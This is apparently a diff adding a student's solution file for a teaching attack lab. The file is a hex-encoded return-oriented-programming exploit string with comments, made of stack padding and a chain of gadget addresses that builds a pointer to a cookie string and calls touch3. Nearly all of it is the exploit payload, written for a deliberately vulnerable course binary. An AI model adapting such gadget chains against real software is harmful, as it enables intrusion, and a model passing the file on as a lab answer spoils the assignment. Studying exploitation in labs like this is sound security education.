@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+6e 1a 40 00 00 00 00 00 /* move rsp to rax (gadget: <getval_281>) */
+b1 19 40 00 00 00 00 00 /* move rax to rdi (gadget: <getval_353>) */
+a5 19 40 00 00 00 00 00 /* pop rax (gadget: <addval_321>) */
+48 00 00 00 00 00 00 00 /* difference between top of stack and cookie value */
+f0 19 40 00 00 00 00 00 /* move eax to edx (gadget: <getval_275>) */
+5c 1a 40 00 00 00 00 00 /* move edx to ecx (gadget: <setval_349>) */
+e2 19 40 00 00 00 00 00 /* move ecx to esi (gadget: <setval_109>) */
+db 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax (gadget: <add_xy>) */
+b1 19 40 00 00 00 00 00 /* move rax to rdi (gadget: <getval_353>) */
+15 19 40 00 00 00 00 00 /* address of touch3 */
+34 32 63 30 63 36 65 33 /* ascii values of cookie */
